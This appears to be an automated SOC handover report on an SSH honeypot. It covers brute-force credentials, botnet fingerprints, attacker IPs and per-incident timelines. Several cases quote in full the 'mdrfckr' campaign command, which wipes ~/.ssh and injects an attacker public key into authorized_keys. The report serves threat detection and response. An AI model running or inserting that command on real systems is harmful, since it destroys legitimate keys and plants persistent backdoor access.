# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-21 |
| **Generated At** | 2026-05-21T09:50:11Z |
| **Shift Time** | 09:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **487** |
| Confirmed Threats | **399** |
| False Positives Filtered | **88** (18.1%) |
| Unique Attacker IPs | **55** |
| Countries of Origin | **30** |
| High Severity Cases | **23** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **464** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **63** |
| Unique Credential Pairs | **34** |
| Unique Usernames | **21** |
| Unique Passwords | **31** |
| Successful Auth Pairs | **17** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 23 |
| `345gs5662d34` | 12 |
| `GET / HTTP/1.1` | 3 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | 3 |
| `*1` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 11 |
| `123456` | 4 |
| `Host: 13.235.92.17:23` | 3 |
| `Accept-Encoding: gzip` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `3245gs5662d34` | 11 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 3 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 3 |
| `*1` | `$4` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `linux` | `40.82.214.8` | 2026-05-21T04:03:38 |
| `root` | `3245gs5662d34` | `40.82.214.8` | 2026-05-21T04:03:44 |
| `root` | `2001` | `222.107.254.97` | 2026-05-21T06:26:39 |
| `root` | `3245gs5662d34` | `222.107.254.97` | 2026-05-21T06:26:43 |
| `root` | `0701` | `109.116.245.48` | 2026-05-21T06:32:16 |
| `root` | `3245gs5662d34` | `109.116.245.48` | 2026-05-21T06:32:20 |
| `root` | `2025` | `103.143.238.100` | 2026-05-21T09:45:17 |
| `root` | `3245gs5662d34` | `103.143.238.100` | 2026-05-21T09:45:23 |
| `root` | `Dd112211` | `103.143.238.100` | 2026-05-21T09:46:22 |
| `root` | `seagroup` | `103.143.238.100` | 2026-05-21T09:47:02 |
| `root` | `lazada` | `102.211.152.138` | 2026-05-21T09:47:08 |
| `root` | `lazada` | `103.143.238.100` | 2026-05-21T09:47:14 |
| `root` | `3245gs5662d34` | `102.211.152.138` | 2026-05-21T09:47:14 |
| `root` | `20230520` | `103.143.238.100` | 2026-05-21T09:47:50 |
| `root` | `world` | `103.143.238.100` | 2026-05-21T09:48:21 |
| `root` | `sms123456` | `103.143.238.100` | 2026-05-21T09:48:37 |
| `root` | `gh001` | `103.143.238.100` | 2026-05-21T09:48:49 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **487** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 54 |
| Unknown | 4 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 49 | 8 |
| `03a80b21afa8...` | Modern SSH client | 4 | 4 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
| `713bd9cc9355...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 49 | 8 | Mirai/variant |
| `03a80b21afa8...` | libssh | 4 | 4 | Modern SSH client |
| `95420f9d932d...` | Unknown | 4 | 3 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `713bd9cc9355...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `222.107.254.97`, `102.211.152.138`, `103.143.238.100`, `109.116.245.48`, `40.82.214.8`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **55** |
| Unique ASNs | **40** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 3 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS135799` | Rapidnet Private Limited | 2 | LOW |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (23)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-15b6d0e77277

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-21 04:03 |
| **Last Seen** | 2026-05-21 04:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 04:03:36` | `cowrie.session.connect` |
| `2026-05-21 04:03:36` | `cowrie.client.version` |
| `2026-05-21 04:03:36` | `cowrie.client.kex` |
| `2026-05-21 04:03:38` | `cowrie.login.success` |
| `2026-05-21 04:03:39` | `cowrie.session.params` |
| `2026-05-21 04:03:39` | `cowrie.command.input` |
| `2026-05-21 04:03:39` | `cowrie.command.failed` |
| `2026-05-21 04:03:39` | `cowrie.log.closed` |
| `2026-05-21 04:03:39` | `cowrie.session.params` |
| `2026-05-21 04:03:39` | `cowrie.command.input` |
| `2026-05-21 04:03:40` | `cowrie.session.file_download` |
| `2026-05-21 04:03:40` | `cowrie.log.closed` |
| `2026-05-21 04:03:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d29797ce4632

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-21 04:03 |
| **Last Seen** | 2026-05-21 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 04:03:43` | `cowrie.session.connect` |
| `2026-05-21 04:03:43` | `cowrie.client.version` |
| `2026-05-21 04:03:43` | `cowrie.client.kex` |
| `2026-05-21 04:03:44` | `cowrie.login.success` |
| `2026-05-21 04:03:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f540049e6fd

| Field | Detail |
|---|---|
| **Source IP** | `222.107.254[.]97` |
| **First Seen** | 2026-05-21 06:26 |
| **Last Seen** | 2026-05-21 06:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 06:26:39` | `cowrie.session.connect` |
| `2026-05-21 06:26:39` | `cowrie.client.version` |
| `2026-05-21 06:26:39` | `cowrie.client.kex` |
| `2026-05-21 06:26:39` | `cowrie.login.success` |
| `2026-05-21 06:26:40` | `cowrie.session.params` |
| `2026-05-21 06:26:40` | `cowrie.command.input` |
| `2026-05-21 06:26:40` | `cowrie.command.failed` |
| `2026-05-21 06:26:40` | `cowrie.log.closed` |
| `2026-05-21 06:26:40` | `cowrie.session.params` |
| `2026-05-21 06:26:40` | `cowrie.command.input` |
| `2026-05-21 06:26:40` | `cowrie.session.file_download` |
| `2026-05-21 06:26:40` | `cowrie.log.closed` |
| `2026-05-21 06:26:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.107.254[.]97` to AbuseIPDB if not already reported
- [ ] Block `222.107.254[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6df3264c012

| Field | Detail |
|---|---|
| **Source IP** | `222.107.254[.]97` |
| **First Seen** | 2026-05-21 06:26 |
| **Last Seen** | 2026-05-21 06:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 06:26:42` | `cowrie.session.connect` |
| `2026-05-21 06:26:42` | `cowrie.client.version` |
| `2026-05-21 06:26:43` | `cowrie.client.kex` |
| `2026-05-21 06:26:43` | `cowrie.login.success` |
| `2026-05-21 06:26:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.107.254[.]97` to AbuseIPDB if not already reported
- [ ] Block `222.107.254[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e84585accfd8

| Field | Detail |
|---|---|
| **Source IP** | `109.116.245[.]48` |
| **First Seen** | 2026-05-21 06:32 |
| **Last Seen** | 2026-05-21 06:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 06:32:15` | `cowrie.session.connect` |
| `2026-05-21 06:32:15` | `cowrie.client.version` |
| `2026-05-21 06:32:15` | `cowrie.client.kex` |
| `2026-05-21 06:32:16` | `cowrie.login.success` |
| `2026-05-21 06:32:16` | `cowrie.session.params` |
| `2026-05-21 06:32:16` | `cowrie.command.input` |
| `2026-05-21 06:32:16` | `cowrie.command.failed` |
| `2026-05-21 06:32:17` | `cowrie.log.closed` |
| `2026-05-21 06:32:17` | `cowrie.session.params` |
| `2026-05-21 06:32:17` | `cowrie.command.input` |
| `2026-05-21 06:32:17` | `cowrie.session.file_download` |
| `2026-05-21 06:32:17` | `cowrie.log.closed` |
| `2026-05-21 06:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.116.245[.]48` to AbuseIPDB if not already reported
- [ ] Block `109.116.245[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2b81803fe75

| Field | Detail |
|---|---|
| **Source IP** | `109.116.245[.]48` |
| **First Seen** | 2026-05-21 06:32 |
| **Last Seen** | 2026-05-21 06:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 06:32:19` | `cowrie.session.connect` |
| `2026-05-21 06:32:19` | `cowrie.client.version` |
| `2026-05-21 06:32:19` | `cowrie.client.kex` |
| `2026-05-21 06:32:20` | `cowrie.login.success` |
| `2026-05-21 06:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.116.245[.]48` to AbuseIPDB if not already reported
- [ ] Block `109.116.245[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f19246f241e7

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:45 |
| **Last Seen** | 2026-05-21 09:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:45:16` | `cowrie.session.connect` |
| `2026-05-21 09:45:16` | `cowrie.client.version` |
| `2026-05-21 09:45:16` | `cowrie.client.kex` |
| `2026-05-21 09:45:17` | `cowrie.login.success` |
| `2026-05-21 09:45:18` | `cowrie.session.params` |
| `2026-05-21 09:45:18` | `cowrie.command.input` |
| `2026-05-21 09:45:18` | `cowrie.command.failed` |
| `2026-05-21 09:45:18` | `cowrie.log.closed` |
| `2026-05-21 09:45:19` | `cowrie.session.params` |
| `2026-05-21 09:45:19` | `cowrie.command.input` |
| `2026-05-21 09:45:19` | `cowrie.session.file_download` |
| `2026-05-21 09:45:19` | `cowrie.log.closed` |
| `2026-05-21 09:45:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d13992ad3a6

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:45 |
| **Last Seen** | 2026-05-21 09:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:45:22` | `cowrie.session.connect` |
| `2026-05-21 09:45:22` | `cowrie.client.version` |
| `2026-05-21 09:45:22` | `cowrie.client.kex` |
| `2026-05-21 09:45:23` | `cowrie.login.success` |
| `2026-05-21 09:45:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-420d5be3fc80

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:46 |
| **Last Seen** | 2026-05-21 09:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:46:21` | `cowrie.session.connect` |
| `2026-05-21 09:46:21` | `cowrie.client.version` |
| `2026-05-21 09:46:21` | `cowrie.client.kex` |
| `2026-05-21 09:46:22` | `cowrie.login.success` |
| `2026-05-21 09:46:22` | `cowrie.session.params` |
| `2026-05-21 09:46:22` | `cowrie.command.input` |
| `2026-05-21 09:46:22` | `cowrie.command.failed` |
| `2026-05-21 09:46:23` | `cowrie.log.closed` |
| `2026-05-21 09:46:23` | `cowrie.session.params` |
| `2026-05-21 09:46:23` | `cowrie.command.input` |
| `2026-05-21 09:46:24` | `cowrie.session.file_download` |
| `2026-05-21 09:46:24` | `cowrie.log.closed` |
| `2026-05-21 09:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5edb2303aaa4

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:46 |
| **Last Seen** | 2026-05-21 09:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:46:27` | `cowrie.session.connect` |
| `2026-05-21 09:46:27` | `cowrie.client.version` |
| `2026-05-21 09:46:27` | `cowrie.client.kex` |
| `2026-05-21 09:46:28` | `cowrie.login.success` |
| `2026-05-21 09:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b668763057d7

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:47 |
| **Last Seen** | 2026-05-21 09:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:47:01` | `cowrie.session.connect` |
| `2026-05-21 09:47:01` | `cowrie.client.version` |
| `2026-05-21 09:47:01` | `cowrie.client.kex` |
| `2026-05-21 09:47:02` | `cowrie.login.success` |
| `2026-05-21 09:47:03` | `cowrie.session.params` |
| `2026-05-21 09:47:03` | `cowrie.command.input` |
| `2026-05-21 09:47:03` | `cowrie.command.failed` |
| `2026-05-21 09:47:03` | `cowrie.log.closed` |
| `2026-05-21 09:47:04` | `cowrie.session.params` |
| `2026-05-21 09:47:04` | `cowrie.command.input` |
| `2026-05-21 09:47:04` | `cowrie.session.file_download` |
| `2026-05-21 09:47:04` | `cowrie.log.closed` |
| `2026-05-21 09:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7291ac761e70

| Field | Detail |
|---|---|
| **Source IP** | `102.211.152[.]138` |
| **First Seen** | 2026-05-21 09:47 |
| **Last Seen** | 2026-05-21 09:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:47:07` | `cowrie.session.connect` |
| `2026-05-21 09:47:07` | `cowrie.client.version` |
| `2026-05-21 09:47:07` | `cowrie.client.kex` |
| `2026-05-21 09:47:08` | `cowrie.login.success` |
| `2026-05-21 09:47:09` | `cowrie.session.params` |
| `2026-05-21 09:47:09` | `cowrie.command.input` |
| `2026-05-21 09:47:09` | `cowrie.command.failed` |
| `2026-05-21 09:47:09` | `cowrie.log.closed` |
| `2026-05-21 09:47:10` | `cowrie.session.params` |
| `2026-05-21 09:47:10` | `cowrie.command.input` |
| `2026-05-21 09:47:10` | `cowrie.session.file_download` |
| `2026-05-21 09:47:10` | `cowrie.log.closed` |
| `2026-05-21 09:47:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.211.152[.]138` to AbuseIPDB if not already reported
- [ ] Block `102.211.152[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
